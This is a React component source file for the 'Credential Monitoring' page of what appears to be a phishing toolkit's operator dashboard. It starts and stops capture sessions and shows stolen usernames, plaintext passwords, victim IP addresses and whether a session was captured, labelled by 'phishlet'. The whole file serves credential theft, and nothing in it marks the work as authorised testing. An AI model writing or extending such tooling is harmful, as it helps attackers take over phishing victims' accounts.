import React, { useState, useEffect } from 'react';
import { API_ENDPOINTS, fetchApi } from '../api';

function Monitoring() {
  const [credentials, setCredentials] = useState([]);
  const [monitors, setMonitors] = useState([]);
  const [loading, setLoading] = useState(true);
  const [monitorLoading, setMonitorLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });
  const [activeMonitor, setActiveMonitor] = useState(null);
  const [autoRefresh, setAutoRefresh] = useState(false);

  useEffect(() => {
    // Initial load
    fetchCredentials();
    fetchMonitors();

    // Set up auto-refresh
    let intervalId;
    if (autoRefresh) {
      intervalId = setInterval(() => {
        fetchCredentials();
      }, 10000); // Refresh every 10 seconds
    }

    return () => {
      if (intervalId) {
        clearInterval(intervalId);
      }
    };
  }, [autoRefresh, activeMonitor]);

  const fetchCredentials = () => {
    setLoading(true);
    
    let url = API_ENDPOINTS.credentials.list;
    if (activeMonitor) {
      url = `${url}?monitor_id=${activeMonitor}`;
    }
    
    // Use a GET request here - this is correct as the endpoint expects GET
    fetch(url)
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          // Sort credentials by timestamp, newest first
          const sortedCreds = data.credentials.sort((a, b) => {
            return new Date(b.timestamp) - new Date(a.timestamp);
          });
          setCredentials(sortedCreds);
        }
        setLoading(false);
      })
      .catch(error => {
        console.error('Error fetching credentials:', error);
        setLoading(false);
      });
  };

  const fetchMonitors = () => {
    setMonitorLoading(true);
    // Use a GET request here - this is correct as the endpoint expects GET
    fetch(API_ENDPOINTS.credentials.monitors)
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          setMonitors(data.monitors);
          
          // Set first active monitor as default if none selected
          if (!activeMonitor && Object.keys(data.monitors).length > 0) {
            const activeMonitorIds = Object.keys(data.monitors).filter(
              id => data.monitors[id].active
            );
            if (activeMonitorIds.length > 0) {
              setActiveMonitor(activeMonitorIds[0]);
            }
          }
        }
        setMonitorLoading(false);
      })
      .catch(error => {
        console.error('Error fetching monitors:', error);
        setMonitorLoading(false);
      });
  };

  const startNewMonitor = () => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    // Explicitly use POST for this endpoint
    fetch(API_ENDPOINTS.credentials.start, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'New monitoring session started successfully!'
          });
          
          // Set the new monitor as active
          setActiveMonitor(data.monitor_id);
          
          // Refresh monitors list
          fetchMonitors();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to start monitoring session.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while starting the monitoring session.'
        });
      });
  };

  const stopMonitor = (monitorId) => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    // Explicitly use POST for this endpoint
    fetch(`${API_ENDPOINTS.credentials.stop}/${monitorId}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Monitoring session stopped successfully!'
          });
          
          // Refresh monitors list
          fetchMonitors();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to stop monitoring session.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while stopping the monitoring session.'
        });
      });
  };

  const clearCredentials = () => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    // Fixed: Use correct way to send monitor_id in POST request body
    const requestBody = activeMonitor ? { monitor_id: activeMonitor } : {};

    // Explicitly use POST for this endpoint
    fetch(API_ENDPOINTS.credentials.clear, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(requestBody)
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Credentials cleared successfully!'
          });
          
          // Refresh credentials
          fetchCredentials();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to clear credentials.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while clearing credentials.'
        });
      });
  };

  return (
    <div className="monitoring">
      <h1>Credential Monitoring</h1>
      <p>View captured credentials from your phishing campaigns.</p>

      {/* Monitoring Controls */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Monitoring Controls</h2>
        </div>
        
        {message.text && (
          <div className={`alert alert-${message.type}`}>
            {message.text}
          </div>
        )}
        
        <div className="monitoring-controls">
          <div className="control-group">
            <button
              className="btn"
              onClick={startNewMonitor}
              disabled={submitting}
            >
              {submitting ? 'Starting...' : 'Start New Monitor'}
            </button>
            
            <div className="form-group inline">
              <label htmlFor="auto-refresh">
                <input
                  type="checkbox"
                  id="auto-refresh"
                  checked={autoRefresh}
                  onChange={() => setAutoRefresh(!autoRefresh)}
                />
                Auto-refresh (every 10s)
              </label>
            </div>
          </div>
          
          {monitorLoading ? (
            <div className="loading">
              <div className="loading-spinner"></div>
            </div>
          ) : Object.keys(monitors).length > 0 ? (
            <div className="monitor-selector">
              <label htmlFor="active-monitor">Active Monitor:</label>
              <select
                id="active-monitor"
                value={activeMonitor || ''}
                onChange={(e) => setActiveMonitor(e.target.value)}
              >
                <option value="">All Monitors</option>
                {Object.entries(monitors).map(([id, monitor], index) => (
                  <option key={index} value={id}>
                    {id.substring(0, 8)} - {monitor.active ? 'Active' : 'Inactive'} ({monitor.credential_count} credentials)
                  </option>
                ))}
              </select>
              
              {activeMonitor && (
                <button
                  className="btn btn-secondary"
                  onClick={() => stopMonitor(activeMonitor)}
                  disabled={submitting}
                >
                  Stop Monitor
                </button>
              )}
            </div>
          ) : (
            <p>No active monitors. Start a new monitoring session.</p>
          )}
        </div>
      </div>

      {/* Credentials Table */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Captured Credentials</h2>
          <div className="card-actions">
            <button
              className="btn btn-secondary"
              onClick={fetchCredentials}
            >
              Refresh
            </button>
            <button
              className="btn btn-danger"
              onClick={clearCredentials}
              disabled={submitting}
            >
              Clear Credentials
            </button>
          </div>
        </div>
        
        {loading ? (
          <div className="loading">
            <div className="loading-spinner"></div>
          </div>
        ) : credentials.length > 0 ? (
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>Source</th>
                  <th>Username</th>
                  <th>Password</th>
                  <th>IP Address</th>
                  <th>Session Captured</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {credentials.map((cred, index) => (
                  <tr key={index}>
                    <td>{cred.source || cred.phishlet || 'Unknown'}</td>
                    <td>{cred.username || '-'}</td>
                    <td>{cred.password || '-'}</td>
                    <td>{cred.ip || '-'}</td>
                    <td>{cred.session_captured ? 'Yes' : 'No'}</td>
                    <td>{new Date(cred.timestamp).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <p>No credentials captured yet.</p>
        )}
      </div>
    </div>
  );
}

export default Monitoring;